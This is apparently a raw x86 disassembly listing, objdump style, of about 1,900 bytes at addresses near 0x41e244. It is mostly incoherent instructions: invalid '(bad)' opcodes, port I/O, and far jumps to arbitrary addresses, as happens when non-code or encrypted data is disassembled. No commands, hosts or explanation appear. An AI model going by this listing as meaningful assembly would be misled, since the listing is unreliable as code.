  41e244:	cmp    bp,WORD PTR [edx-0x3a]
  41e248:	push   ebx
  41e249:	pop    es
  41e24a:	ins    BYTE PTR es:[edi],dx
  41e24b:	cld    
  41e24c:	mov    esi,DWORD PTR [edi]
  41e24e:	lahf   
  41e24f:	dec    ebx
  41e250:	sbb    eax,0xa622364b
  41e255:	data16 cli 
  41e257:	in     al,0x92
  41e259:	sbb    BYTE PTR [ebx+0x51],bh
  41e25c:	ja     0x41e1fa
  41e25e:	push   0xf
  41e260:	in     eax,dx
  41e261:	and    BYTE PTR [eax+ecx*1],al
  41e264:	xor    al,0xce
  41e266:	pop    ecx
  41e267:	jbe    0x41e20c
  41e269:	push   cs
  41e26a:	jns    0x41e24b
  41e26c:	sub    ecx,esp
  41e26e:	sub    WORD PTR [ebx-0x59dfac92],di
  41e275:	jmp    0x69694914
  41e27a:	jmp    0x41e2a2
  41e27c:	mov    cl,0x58
  41e27e:	call   0x33be:0x4c2c34f2
  41e285:	mov    dl,0x45
  41e287:	cdq    
  41e288:	xchg   BYTE PTR [ebp-0x74],ch
  41e28b:	(bad)  
  41e28d:	enter  0x1831,0x31
  41e291:	hlt    
  41e292:	xor    eax,0x9c06c4ce
  41e297:	in     eax,0x4c
  41e299:	xchg   eax,esi
  41e29b:	cdq    
  41e29c:	in     al,dx
  41e29d:	sbb    DWORD PTR [ecx-0x73],edi
  41e2a0:	add    eax,0x26eb91b1
  41e2a5:	fwait
  41e2a6:	sti    
  41e2a7:	cmp    al,0xc0
  41e2a9:	adc    DWORD PTR [esi+0x35b48de9],ebx
  41e2af:	icebp  
  41e2b0:	pop    es
  41e2b1:	div    DWORD PTR [edx+0x282af4ab]
  41e2b7:	nop
  41e2b8:	mov    bl,0xe0
  41e2ba:	neg    BYTE PTR [eax]
  41e2bc:	xor    cl,BYTE PTR [edx-0x27]
  41e2bf:	retf   0x9ca3
  41e2c2:	stc    
  41e2c3:	cli    
  41e2c4:	sbb    cl,dl
  41e2c6:	arpl   WORD PTR [esi+0x1b8fed54],si
  41e2cc:	cmp    eax,0x7efd0df7
  41e2d1:	dec    eax
  41e2d2:	push   0xa00ab6a4
  41e2d7:	mov    edi,0x16d77979
  41e2dc:	mov    ebx,0xf4bfb32d
  41e2e1:	mov    al,ds:0x6c61e2ec
  41e2e6:	sbb    DWORD PTR [esi],edi
  41e2e8:	xor    bh,BYTE PTR [ecx]
  41e2ea:	popa   
  41e2eb:	fptan  
  41e2ed:	retf   0xd95f
  41e2f0:	pop    ds
  41e2f1:	fmul   QWORD PTR [ebx+ecx*8+0x7c]
  41e2f5:	adc    al,0xf8
  41e2f7:	xchg   esi,eax
  41e2f8:	jnp    0x41e319
  41e2fa:	dec    ebx
  41e2fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2fc:	inc    ebx
  41e2fd:	inc    esp
  41e2fe:	mov    dh,0x21
  41e300:	dec    ebx
  41e301:	ja     0x41e2a1
  41e303:	sbb    BYTE PTR [eax],0xf8
  41e306:	inc    eax
  41e307:	cmp    al,0x42
  41e309:	inc    ecx
  41e30a:	mov    ah,0x2c
  41e30c:	and    dh,bh
  41e30e:	or     ebx,DWORD PTR [eax]
  41e310:	jge    0x41e31e
  41e312:	push   esi
  41e313:	dec    esp
  41e314:	add    al,0xa3
  41e316:	and    eax,0x88325888
  41e31b:	sbb    BYTE PTR [ebx+0x3b],bh
  41e31e:	cmc    
  41e31f:	add    eax,0xaafa33cc
  41e324:	fmul   DWORD PTR [ebx+0xed26f02]
  41e32a:	mov    ecx,0x4d4c19f0
  41e32f:	jns    0x41e312
  41e331:	adc    eax,0x32939065
  41e336:	mov    ss,WORD PTR [esi]
  41e338:	mov    BYTE PTR [edi+0x78],al
  41e33b:	out    dx,al
  41e33c:	cmp    al,0x3b
  41e33e:	cmc    
  41e33f:	mov    esp,DWORD PTR [edx]
  41e341:	cmp    eax,0xe06f983f
  41e346:	shl    BYTE PTR [edx+0x69],0xa2
  41e34a:	push   edi
  41e34b:	mov    dh,0xa0
  41e34d:	cwde   
  41e34e:	mov    ?,WORD PTR [ebp-0x45]
  41e351:	or     al,al
  41e353:	and    BYTE PTR [eax-0x11edcc00],0xfe
  41e35a:	loop   0x41e359
  41e35c:	mov    al,0x5c
  41e35e:	sti    
  41e35f:	enter  0x6cb6,0xe3
  41e363:	std    
  41e364:	jno    0x41e3d0
  41e366:	jg     0x41e2f5
  41e368:	fild   QWORD PTR [edx-0x694b7a0b]
  41e36e:	xor    bl,BYTE PTR [edi]
  41e370:	inc    edi
  41e371:	push   ecx
  41e372:	add    dh,BYTE PTR [ebx-0x58889a1b]
  41e378:	and    al,0xe8
  41e37a:	push   0xe5571219
  41e37f:	std    
  41e380:	out    dx,eax
  41e381:	pop    eax
  41e382:	sub    DWORD PTR [edi+0x464f50cd],ebx
  41e388:	xor    eax,0xca6be6c6
  41e38d:	inc    esi
  41e38e:	xchg   edx,eax
  41e38f:	inc    edx
  41e390:	jnp    0x41e344
  41e392:	mov    dl,BYTE PTR [esi-0x1ca2b1c]
  41e398:	jne    0x41e391
  41e39a:	lods   eax,DWORD PTR ds:[esi]
  41e39b:	(bad)  
  41e39d:	(bad)  
  41e39e:	fs pop ds
  41e3a0:	add    al,0x59
  41e3a2:	in     al,0x66
  41e3a4:	inc    ebp
  41e3a5:	push   ebp
  41e3a6:	in     eax,dx
  41e3a7:	bnd jnp 0x41e366
  41e3aa:	pop    ecx
  41e3ab:	(bad)  
  41e3ac:	loopne 0x41e3ed
  41e3ae:	in     eax,dx
  41e3af:	xchg   BYTE PTR [edi+0x37a79295],bh
  41e3b5:	jno    0x41e38a
  41e3b7:	leave  
  41e3b8:	fld    QWORD PTR [esi+0x57]
  41e3bb:	(bad)  
  41e3bc:	iret   
  41e3bd:	and    BYTE PTR [edi],0x92
  41e3c0:	xor    eax,0x79cf3aa
  41e3c5:	sbb    eax,0xade0e891
  41e3ca:	dec    edi
  41e3cb:	iret   
  41e3cc:	push   ecx
  41e3cd:	aaa    
  41e3ce:	cmp    BYTE PTR [esp+edx*1+0x2d534fb1],dl
  41e3d5:	pop    es
  41e3d6:	retf   0xd3fb
  41e3d9:	cmp    DWORD PTR [ebp+0x7699655d],edi
  41e3df:	mov    esi,0x8f5d6ba7
  41e3e4:	xor    al,0xe0
  41e3e6:	fdiv   DWORD PTR [ecx-0x232d83ea]
  41e3ec:	in     al,0xb7
  41e3ee:	out    dx,eax
  41e3ef:	fs dec esi
  41e3f1:	repz rol DWORD PTR [edx+0x48],0xab
  41e3f6:	iret   
  41e3f7:	ret    
  41e3f8:	push   cs
  41e3f9:	or     esi,DWORD PTR [edx-0xf825f01]
  41e3ff:	push   es
  41e400:	hlt    
  41e401:	in     al,dx
  41e402:	(bad)  
  41e403:	rcr    DWORD PTR [eax+ebp*8+0x17],cl
  41e407:	fld    DWORD PTR [ebx+ebp*1-0x35]
  41e40b:	sub    dl,bh
  41e40d:	bound  esi,QWORD PTR [ebx-0x6dae578e]
  41e413:	adc    esi,DWORD PTR [esi+0x6d]
  41e416:	pop    es
  41e417:	adc    DWORD PTR [eax+0x11],eax
  41e41a:	jl     0x41e3fc
  41e41c:	call   0x65c4e148
  41e421:	in     al,dx
  41e422:	mul    BYTE PTR [edx+0x3c]
  41e425:	jb     0x41e3ef
  41e427:	mov    WORD PTR [eax],gs
  41e429:	jmp    0x8934e043
  41e42e:	push   ss
  41e42f:	xor    al,0x68
  41e431:	idiv   DWORD PTR [ebx-0xda10106]
  41e437:	xor    ah,BYTE PTR [edi]
  41e439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e43a:	lods   al,BYTE PTR ds:[esi]
  41e43b:	pop    ebp
  41e43c:	call   0x5936:0x39d328a6
  41e443:	push   ebp
  41e444:	and    bl,0x6e
  41e447:	push   esi
  41e448:	pop    esp
  41e449:	inc    eax
  41e44a:	aas    
  41e44b:	jle    0x41e450
  41e44d:	fdivr  DWORD PTR [ebx+0x68]
  41e450:	int3   
  41e451:	dec    edx
  41e452:	adc    al,0xc2
  41e454:	inc    ebx
  41e455:	jecxz  0x41e428
  41e457:	psrld  mm7,QWORD PTR [edi+0x10d48c2e]
  41e45e:	mov    al,0x4e
  41e460:	and    DWORD PTR [edi],esi
  41e462:	retf   
  41e463:	mov    ch,dl
  41e465:	in     eax,dx
  41e466:	in     eax,0x40
  41e468:	jg     0x41e4e3
  41e46a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e46b:	lds    eax,FWORD PTR [ecx]
  41e46d:	mov    ah,0x26
  41e46f:	fs fucomp st(3)
  41e472:	or     DWORD PTR [eax+0x24],ecx
  41e475:	push   ss
  41e476:	xchg   esp,eax
  41e477:	jnp    0x41e495
  41e479:	add    cl,dl
  41e47b:	mov    BYTE PTR [edi+edi*2+0x61544218],dl
  41e482:	cmc    
  41e483:	sub    al,0x52
  41e485:	retf   
  41e486:	or     DWORD PTR [ebp+eax*1-0xd0720db],eax
  41e48d:	mov    bl,0x66
  41e48f:	xlat   BYTE PTR ds:[ebx]
  41e490:	cli    
  41e491:	mov    esi,0x195cbe69
  41e496:	mov    dl,0xc2
  41e498:	mov    ch,0xa4
  41e49a:	outs   dx,BYTE PTR ds:[esi]
  41e49b:	test   eax,0xff961785
  41e4a0:	jae    0x1b528652
  41e4a6:	arpl   WORD PTR [edi-0x78ad583],ax
  41e4ac:	mov    edi,0x6256db4d
  41e4b1:	fidivr DWORD PTR [ecx-0x71]
  41e4b4:	push   ecx
  41e4b5:	mov    cl,0xe0
  41e4b7:	xchg   edi,eax
  41e4b8:	retf   0x6c1d
  41e4bb:	cmp    BYTE PTR [eax-0x5cf219fe],bh
  41e4c1:	xor    ah,BYTE PTR [ecx+0x2d]
  41e4c4:	jb     0x41e4ff
  41e4c6:	jmp    0xde40:0xd9efd5ba
  41e4cd:	mov    eax,0xf2adb658
  41e4d2:	jmp    0x429985d1
  41e4d7:	fst    DWORD PTR [edi+ebx*2+0x5ee229ce]
  41e4de:	test   ah,al
  41e4e0:	dec    ecx
  41e4e1:	lods   al,BYTE PTR ds:[esi]
  41e4e2:	fwait
  41e4e3:	out    0x83,al
  41e4e5:	ins    BYTE PTR es:[edi],dx
  41e4e6:	neg    DWORD PTR [edi]
  41e4e8:	xchg   esi,eax
  41e4e9:	stos   DWORD PTR es:[edi],eax
  41e4ea:	add    ecx,DWORD PTR [eax]
  41e4ec:	fistp  QWORD PTR [ebx-0x61]
  41e4ef:	fsubp  st(0),st
  41e4f1:	xor    dl,dh
  41e4f3:	push   esp
  41e4f4:	mov    esp,0x35ce5ecc
  41e4f9:	fnsave [ebx+ebx*4+0x4948b372]
  41e500:	sbb    DWORD PTR [edx+0x1ab01299],0xffffffde
  41e507:	pop    es
  41e508:	dec    edx
  41e509:	jno    0x41e511
  41e50b:	jno    0x41e4fc
  41e50d:	mov    al,0x7a
  41e50f:	lea    ecx,ds:0x97012904
  41e515:	push   edi
  41e516:	dec    esi
  41e517:	lds    ebx,FWORD PTR [edi]
  41e519:	push   ecx
  41e51a:	xor    al,0x80
  41e51c:	jb     0x41e540
  41e51e:	sub    BYTE PTR [ecx+0x4e],0xdf
  41e522:	test   BYTE PTR [edi-0x71],0xe7
  41e526:	xor    edx,DWORD PTR [edx]
  41e528:	and    DWORD PTR [ebx-0x46],esi
  41e52b:	mov    edx,0xf3eeaa41
  41e530:	mov    al,ds:0x6b58be16
  41e535:	lahf   
  41e536:	inc    bp
  41e538:	sub    ebp,esi
  41e53a:	out    dx,al
  41e53b:	je     0x41e5a3
  41e53d:	mov    edi,0x937a43db
  41e542:	outs   dx,DWORD PTR ds:[esi]
  41e543:	add    cl,BYTE PTR [esi+0x75]
  41e546:	ficom  WORD PTR [ebp+0x54]
  41e549:	mov    ds:0x8be0d4bd,al
  41e54e:	add    eax,0xd88b4b87
  41e553:	mov    ch,0xee
  41e555:	mov    dl,0xe3
  41e557:	shr    BYTE PTR [ecx-0x38],1
  41e55a:	pop    esi
  41e55b:	add    ebx,0xea1e6844
  41e561:	sti    
  41e562:	stos   BYTE PTR es:[edi],al
  41e563:	out    dx,al
  41e564:	out    dx,eax
  41e565:	aam    0x9c
  41e567:	pop    es
  41e568:	imul   ebp,DWORD PTR [esi+0x1103c457],0x52566dee
  41e572:	ins    BYTE PTR es:[edi],dx
  41e573:	mov    WORD PTR ds:0xdc129969,fs
  41e579:	pop    ebx
  41e57a:	rcl    ecx,cl
  41e57c:	(bad)  
  41e57d:	push   ebp
  41e57e:	test   eax,0xe81c64c4
  41e583:	mov    dh,0x46
  41e585:	je     0x41e563
  41e587:	xor    al,0xa
  41e589:	test   eax,0x84175c
  41e58e:	fcomi  st,st(2)
  41e590:	dec    eax
  41e591:	dec    edx
  41e592:	xchg   edx,eax
  41e593:	or     BYTE PTR [ebp-0x50],ah
  41e596:	cdq    
  41e597:	js     0x41e5d6
  41e599:	sbb    BYTE PTR [esi-0x7764ccd9],al
  41e59f:	or     eax,0x85b6db40
  41e5a4:	jb     0x41e5d4
  41e5a6:	dec    ecx
  41e5a7:	popf   
  41e5a8:	inc    ebx
  41e5a9:	push   esi
  41e5aa:	stos   BYTE PTR es:[edi],al
  41e5ab:	or     BYTE PTR [ebp+0x1cbbedd3],bh
  41e5b1:	(bad)  
  41e5b2:	loopne 0x41e5e6
  41e5b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5b5:	dec    edx
  41e5b6:	fwait
  41e5b7:	ret    0x6cf9
  41e5ba:	test   DWORD PTR ds:[eax],edi
  41e5bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5be:	in     al,dx
  41e5bf:	add    eax,0xbd0c7cd6
  41e5c4:	icebp  
  41e5c5:	mov    eax,ds:0x1dec0157
  41e5ca:	jp     0x41e585
  41e5cc:	jmp    0x338f1468
  41e5d1:	xchg   DWORD PTR [esi+0x4e9c0e21],esi
  41e5d7:	call   0x55a6f356
  41e5dc:	sub    ch,ah
  41e5de:	xor    ch,BYTE PTR [edi+0x1d2bf86c]
  41e5e4:	xchg   edx,eax
  41e5e5:	shl    BYTE PTR [edx-0x75],1
  41e5e8:	xor    eax,0x4b1083e1
  41e5ed:	add    eax,0x7fda5d90
  41e5f2:	push   ecx
  41e5f3:	push   ss
  41e5f4:	inc    ebp
  41e5f5:	push   0x10
  41e5f7:	push   cs
  41e5f8:	mov    esi,0x417a2400
  41e5fd:	add    edi,DWORD PTR [ebx-0x51548288]
  41e603:	dec    ebp
  41e604:	adc    bl,BYTE PTR [esi-0x5ded154e]
  41e60a:	pop    ds
  41e60b:	sbb    BYTE PTR [edi],dh
  41e60d:	js     0x41e5a0
  41e60f:	jb     0x41e5cc
  41e611:	clc    
  41e612:	pop    es
  41e613:	mov    bh,0x8a
  41e615:	(bad)  
  41e616:	fidiv  WORD PTR [ecx+0x6049afdd]
  41e61c:	lea    esp,[ecx]
  41e61e:	(bad)  
  41e61f:	(bad)  
  41e620:	xlat   BYTE PTR ds:[ebx]
  41e621:	mov    edx,0x858b1912
  41e626:	jmp    0x41e64d
  41e628:	inc    edx
  41e629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e62a:	or     DWORD PTR [edx],esi
  41e62c:	mov    esi,0x81406e60
  41e631:	lock out 0xd,al
  41e634:	dec    ecx
  41e635:	inc    ebx
  41e636:	xor    al,0xd7
  41e638:	push   ebp
  41e639:	push   0xffffffcd
  41e63b:	jle    0x41e622
  41e63d:	xchg   esp,eax
  41e63e:	out    dx,eax
  41e63f:	xlat   BYTE PTR ds:[ebx]
  41e640:	mov    ch,0x5c
  41e642:	out    0x48,al
  41e644:	clc    
  41e645:	and    dl,BYTE PTR ss:[ebp+0x6f75b172]
  41e64c:	jl     0x41e620
  41e64e:	enter  0x9609,0x14
  41e652:	int3   
  41e653:	(bad)  
  41e654:	es push ds
  41e656:	lock mov eax,edi
  41e659:	cmova  eax,edx
  41e65c:	inc    esp
  41e65d:	retf   
  41e65e:	fisubr DWORD PTR [ebp+0x4f5b93a1]
  41e664:	mov    edi,0xd7acd20c
  41e669:	xchg   edx,eax
  41e66a:	loop   0x41e6b5
  41e66c:	jecxz  0x41e688
  41e66e:	jns    0x41e66e
  41e670:	cli    
  41e671:	call   0x531f4a36
  41e676:	cmp    eax,DWORD PTR [edx]
  41e678:	inc    ebp
  41e679:	test   eax,0xa08fa389
  41e67e:	fbld   TBYTE PTR [ebx]
  41e680:	pushf  
  41e681:	sahf   
  41e682:	mov    esi,0x4205bdf8
  41e687:	imul   edi,DWORD PTR [ecx*8-0x7bca5399],0x6ba94fde
  41e692:	dec    ecx
  41e693:	(bad)  
  41e694:	jno    0x41e6fb
  41e696:	les    edi,FWORD PTR [edx+0xf1adc19]
  41e69c:	add    eax,0xc96fdf73
  41e6a1:	xchg   esp,eax
  41e6a2:	dec    esp
  41e6a3:	pop    esi
  41e6a4:	and    al,0xa0
  41e6a6:	pop    ecx
  41e6a7:	or     cl,BYTE PTR [ebx]
  41e6a9:	ss in  eax,dx
  41e6ab:	into   
  41e6ac:	inc    edi
  41e6ad:	mov    ch,0x84
  41e6af:	or     ebp,DWORD PTR [esi+edi*4+0x13]
  41e6b3:	push   edi
  41e6b4:	lods   eax,DWORD PTR ds:[esi]
  41e6b5:	jg     0x41e735
  41e6b7:	jmp    0x6656:0xdab7b7d7
  41e6be:	bound  esi,QWORD PTR [ebx]
  41e6c0:	aaa    
  41e6c1:	je     0x41e6bf
  41e6c3:	add    bl,bl
  41e6c5:	jmp    0x2c19:0x108411aa
  41e6cc:	mov    ebx,DWORD PTR [esi+ebp*2]
  41e6cf:	stos   DWORD PTR es:[edi],eax
  41e6d0:	int    0xfc
  41e6d2:	neg    ecx
  41e6d4:	js     0x41e68a
  41e6d6:	xor    cl,BYTE PTR [ebp+0x37]
  41e6d9:	sar    bh,1
  41e6db:	mov    esp,0xfaaa25e5
  41e6e0:	ins    DWORD PTR es:[edi],dx
  41e6e1:	and    esp,DWORD PTR [edx]
  41e6e3:	adc    DWORD PTR [edx+edi*8+0x65ae731b],eax
  41e6ea:	mov    ecx,0xfb6e5c22
  41e6ef:	jle    0x41e727
  41e6f1:	sbb    eax,edi
  41e6f3:	jnp    0x41e74f
  41e6f5:	push   es
  41e6f6:	mov    dh,0xf4
  41e6f8:	hlt    
  41e6f9:	jge    0x41e6a2
  41e6fb:	ja     0x41e728
  41e6fd:	mov    BYTE PTR [ecx],ch
  41e6ff:	sahf   
  41e700:	inc    edi
  41e701:	bound  ebx,QWORD PTR ds:[edi+0x69]
  41e705:	gs xor al,0x82
  41e708:	aam    0x70
  41e70a:	sbb    esp,ecx
  41e70c:	or     eax,0x5486ec2
  41e711:	aaa    
  41e712:	sub    esp,DWORD PTR [esi+edx*1]
  41e715:	call   FWORD PTR [edx+ebx*1+0x489692f6]
  41e71c:	stos   BYTE PTR es:[edi],al
  41e71d:	test   eax,0xb1f3f1e6
  41e722:	and    cl,al
  41e724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e726:	lahf   
  41e727:	call   0x5090ff13
  41e72c:	pop    ebx
  41e72d:	js     0x41e720
  41e72f:	lahf   
  41e730:	cmp    eax,0xc1378f59
  41e735:	lahf   
  41e736:	jns    0x41e7ad
  41e738:	fisub  DWORD PTR [eax]
  41e73a:	mov    edx,0x81ec04b7
  41e73f:	dec    esp
  41e740:	jo     0x41e7b3
  41e742:	out    dx,eax
  41e743:	inc    edx
  41e744:	jmp    0x7353cf8f
  41e749:	neg    BYTE PTR ds:0xb8ccfc9f
  41e74f:	pop    es
  41e750:	sbb    BYTE PTR [eax+0x75689cdf],bl
  41e756:	inc    ebx
  41e757:	xchg   ebp,eax
  41e758:	in     eax,0xb6
  41e75a:	shl    ebx,0xba
  41e75d:	adc    eax,0xc246bfca
  41e762:	add    BYTE PTR [eax],ah
  41e764:	push   ebp
  41e765:	or     eax,0x626cc74
  41e76a:	lods   eax,DWORD PTR ds:[esi]
  41e76b:	adc    bl,BYTE PTR [edx+0x25]
  41e76e:	and    ecx,eax
  41e770:	add    eax,DWORD PTR [ecx+0x6e]
  41e773:	fisttp WORD PTR [ebp-0x6c1dc9ee]
  41e779:	mov    BYTE PTR [ebx-0xe],cl
  41e77c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e77d:	add    BYTE PTR [ebp-0x24],al
  41e780:	add    edi,ecx
  41e782:	pop    ss
  41e783:	dec    ebx
  41e784:	int3   
  41e785:	cmp    DWORD PTR [edx+eiz*8-0x4d],edx
  41e789:	cdq    
  41e78a:	leave  
  41e78b:	xchg   esi,eax
  41e78c:	mov    al,ds:0x460e0b4a
  41e791:	aaa    
  41e792:	(bad)  
  41e794:	test   DWORD PTR [ecx+0x35954b82],ebx
  41e79a:	inc    esp
  41e79b:	lds    ecx,FWORD PTR [edi]
  41e79d:	add    ebx,ecx
  41e79f:	mov    ss,WORD PTR [ebp-0x33]
  41e7a2:	inc    edx
  41e7a3:	inc    ecx
  41e7a4:	outs   dx,BYTE PTR ds:[esi]
  41e7a5:	mov    ebx,0xd4edca12
  41e7aa:	popa   
  41e7ab:	pop    esp
  41e7ac:	push   esi
  41e7ad:	stos   BYTE PTR es:[edi],al
  41e7ae:	jl     0x41e7ce
  41e7b0:	mov    ch,0x34
  41e7b2:	scas   eax,DWORD PTR es:[edi]
  41e7b3:	inc    ebx
  41e7b4:	and    esi,edi
  41e7b6:	daa    
  41e7b7:	dec    ebx
  41e7b8:	retf   
  41e7b9:	cli    
  41e7ba:	scas   al,BYTE PTR es:[edi]
  41e7bb:	add    DWORD PTR [edi],ecx
  41e7bd:	out    dx,eax
  41e7be:	add    eax,0x3ef35a7f
  41e7c3:	jle    0x41e7de
  41e7c5:	(bad)  
  41e7c6:	cld    
  41e7c7:	retf   0xbf04
  41e7ca:	aam    0x98
  41e7cc:	inc    edx
  41e7cd:	push   ds
  41e7ce:	xchg   ebx,eax
  41e7cf:	mov    cs,ecx
  41e7d1:	xchg   esi,eax
  41e7d2:	jl     0x41e7d3
  41e7d4:	mov    esi,0x4f7cbd72
  41e7d9:	mov    ebp,0x65618655
  41e7de:	jns    0x41e792
  41e7e0:	test   DWORD PTR [ecx],esi
  41e7e2:	inc    ebp
  41e7e3:	xchg   edx,eax
  41e7e4:	dec    ebx
  41e7e5:	out    0xb1,al
  41e7e7:	sbb    DWORD PTR [ecx+edx*8],esi
  41e7ea:	les    ecx,FWORD PTR [ecx-0x171c3160]
  41e7f0:	loopne 0x41e78d
  41e7f2:	neg    ebx
  41e7f4:	inc    ebx
  41e7f5:	cmp    BYTE PTR [ecx-0x50],0xf8
  41e7f9:	rol    DWORD PTR [ebx+0x41],0xd2
  41e7fd:	inc    ebx
  41e7fe:	lods   eax,DWORD PTR ds:[esi]
  41e7ff:	scas   al,BYTE PTR es:[edi]
  41e800:	inc    ebx
  41e801:	push   0xfffffff9
  41e803:	pushf  
  41e804:	sub    DWORD PTR [ebx+0x1c72122],edx
  41e80a:	xchg   ebp,eax
  41e80b:	dec    esi
  41e80c:	inc    ebx
  41e80d:	inc    eax
  41e80e:	mov    ah,0x46
  41e810:	xchg   ebx,eax
  41e811:	(bad)  
  41e812:	and    DWORD PTR [edi],esi
  41e814:	cmp    eax,0xd4657731
  41e819:	iret   
  41e81a:	test   BYTE PTR [edi],0x5
  41e81d:	call   0xf71361f3
  41e822:	sbb    esp,esi
  41e824:	(bad)  
  41e825:	frstor [eax]
  41e827:	(bad)  
  41e828:	loopne 0x41e7bf
  41e82a:	jo     0x41e851
  41e82c:	ins    DWORD PTR es:[edi],dx
  41e82d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e82e:	(bad)  
  41e82f:	aad    0xde
  41e831:	and    BYTE PTR [ecx+0x4b],0x21
  41e835:	(bad)  
  41e836:	in     al,0x5
  41e838:	imul   ebp,eax,0xffffff9f
  41e83b:	pop    ss
  41e83c:	div    DWORD PTR [ecx]
  41e83e:	fwait
  41e83f:	pop    ebx
  41e840:	push   edx
  41e841:	push   ebp
  41e842:	fsubr  DWORD PTR [ecx]
  41e844:	popf   
  41e845:	jnp    0x41e853
  41e847:	jbe    0x41e801
  41e849:	mov    eax,0xdc17ec32
  41e84e:	arpl   WORD PTR [edx-0x2d0cd407],di
  41e854:	jb     0x41e7d8
  41e856:	mov    bh,BYTE PTR [ebx]
  41e858:	test   bh,0x44
  41e85b:	inc    esp
  41e85c:	mov    esi,0x76964fda
  41e861:	mov    ah,0x44
  41e863:	cmp    BYTE PTR [ebx-0x3785104d],ah
  41e869:	adc    eax,0x75f0e50c
  41e86e:	sub    BYTE PTR gs:[ecx+edx*8-0x36],cl
  41e873:	sar    BYTE PTR [edx],0x88
  41e876:	mov    al,ds:0x960b9c41
  41e87b:	xchg   DWORD PTR [esi],esp
  41e87d:	lock mov eax,0xb00af3c6
  41e883:	sar    DWORD PTR cs:[ebx-0x7a],cl
  41e887:	mov    ebp,0x6f3e2d58
  41e88c:	ds dec esp
  41e88e:	bound  ebp,QWORD PTR [edi]
  41e890:	in     al,0x55
  41e892:	jmp    0x39c2:0x43795f4e
  41e899:	and    eax,0x8a2402a3
  41e89e:	push   esi
  41e89f:	imul   ebp,DWORD PTR [ebp+0x7e],0x5ff08c3e
  41e8a6:	jmp    0x41e918
  41e8a8:	stos   BYTE PTR es:[edi],al
  41e8a9:	clc    
  41e8aa:	scas   al,BYTE PTR es:[edi]
  41e8ab:	push   eax
  41e8ac:	clc    
  41e8ad:	mov    ds:0x23b697bd,eax
  41e8b2:	out    0x3a,eax
  41e8b4:	test   al,0x84
  41e8b6:	mov    ecx,DWORD PTR [esp+esi*4+0x571809a5]
  41e8bd:	mov    cl,dh
  41e8bf:	fmul   DWORD PTR [eax+0x5024009b]
  41e8c5:	pusha  
  41e8c6:	fistp  QWORD PTR [eax+esi*1+0x6e]
  41e8ca:	imul   edi,DWORD PTR [ecx],0x5b32e2f1
  41e8d0:	mov    esp,0x7776ae58
  41e8d5:	dec    ecx
  41e8d6:	adc    eax,0x5d884487
  41e8db:	mov    ebp,0x1dfb2a0c
  41e8e0:	mov    ebx,0x9cd79b0
  41e8e5:	sbb    al,BYTE PTR [edi]
  41e8e7:	rcl    DWORD PTR [eax],1
  41e8e9:	jnp    0x41e89a
  41e8eb:	dec    esp
  41e8ec:	in     eax,0xaa
  41e8ee:	dec    esp
  41e8ef:	loope  0x41e963
  41e8f1:	fidiv  DWORD PTR cs:[edx]
  41e8f4:	hlt    
  41e8f5:	jo     0x41e946
  41e8f7:	lahf   
  41e8f8:	adc    BYTE PTR [edx],bh
  41e8fa:	pop    ds
  41e8fb:	bound  ebx,QWORD PTR [edx+0x3e6eb769]
  41e901:	rcl    BYTE PTR ds:0xe8145c18,1
  41e907:	retf   0x65cc
  41e90a:	push   ss
  41e90b:	xchg   BYTE PTR [edi-0x2b],ch
  41e90e:	mov    ds:0x95a10423,eax
  41e913:	dec    esi
  41e914:	sbb    eax,0xbd1079a
  41e919:	retf   0xff67
  41e91c:	jne    0x41e8a8
  41e91e:	cmp    edx,edx
  41e920:	inc    edx
  41e921:	dec    edx
  41e922:	outs   dx,BYTE PTR ds:[esi]
  41e923:	lock jg 0x41e8c2
  41e926:	push   0xfffffff2
  41e928:	out    dx,eax
  41e929:	push   ebx
  41e92a:	mov    al,0x5a
  41e92c:	js     0x41e995
  41e92e:	pop    edx
  41e92f:	cli    
  41e930:	push   0x2e
  41e932:	out    dx,al
  41e933:	rol    BYTE PTR [edx+edi*8],cl
  41e936:	adc    BYTE PTR [eax],al
  41e938:	in     al,0x42
  41e93a:	(bad)  
  41e93b:	leave  
  41e93c:	dec    ebp
  41e93d:	add    al,0xf5
  41e93f:	shr    BYTE PTR [edx+0x4008a5fa],1
  41e945:	adc    eax,0x4861a4f3
  41e94a:	adc    eax,0x6f65df15
  41e94f:	inc    esi
  41e950:	out    dx,eax
  41e951:	ror    BYTE PTR [edi+0x1e],cl
  41e954:	bound  edi,QWORD PTR [eax]
  41e956:	xor    edi,DWORD PTR [ebx]
  41e958:	jl     0x41e8ee
  41e95a:	in     eax,0x73
  41e95c:	dec    eax
  41e95d:	imul   esi,DWORD PTR [ecx],0x76
  41e960:	cld    
  41e961:	jnp    0x41e8fc
  41e963:	mov    ecx,0x718cef82
  41e968:	adc    dh,BYTE PTR [eax]
  41e96a:	test   al,0xdd
  41e96c:	enter  0x70e,0xab
  41e970:	add    BYTE PTR [edi+eiz*2+0x64fc02e9],0xab
  41e978:	xchg   ecx,eax
  41e979:	and    al,0x7a
  41e97b:	xor    dl,BYTE PTR [edi+0x50]
  41e97e:	sub    ebx,edi
  41e980:	jmp    0x41e90e
  41e982:	or     bl,BYTE PTR [ecx-0x33c128a]
  41e988:	mov    ecx,0x59db8395
  41e98d:	outs   dx,BYTE PTR ds:[esi]
  41e98e:	inc    edi
  41e98f:	retf   0xf3d4
  41e992:	sbb    al,0xc
  41e994:	ins    BYTE PTR es:[edi],dx
  41e995:	mov    esp,0xa79acd08
  41e99a:	cdq    
  41e99b:	add    eax,0x8db145e7
  41e9a0:	dec    esp
  41e9a1:	fmul   DWORD PTR [edi+0x3f3426d2]
  41e9a7:	fld    TBYTE PTR ds:0xa5762a69
  41e9ad:	mov    eax,0xfbb1027f
  41e9b2:	fcom   QWORD PTR [ebx-0x15]
  41e9b5:	shl    BYTE PTR [ecx],1
  41e9b7:	test   eax,0x10243bf
  41e9bc:	ret    0x513c
  41e9bf:	in     al,dx
  41e9c0:	fbld   TBYTE PTR [ecx]
  41e9c2:	fsubr  DWORD PTR [esi-0x72]
  41e9c5:	or     ebp,edx
